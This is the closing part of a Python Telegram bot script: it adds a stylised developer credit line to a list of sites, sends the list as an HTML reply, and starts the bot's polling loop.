    sites_list += f"[<a href='https://t.me/stormxvup'>⌬</a>] <strong>𝐁𝐨𝐭 𝐁𝐲</strong> ↣ <a href='tg://user?id={DARKS_ID}'>⏤‌‌𝐃𝐚𝐫𝐤𝐛𝐨𝐲 ꯭𖠌</a>"

    bot.reply_to(message, sites_list, parse_mode="HTML")


if __name__ == "__main__":
    print("Bot started...")
    bot.infinity_polling()
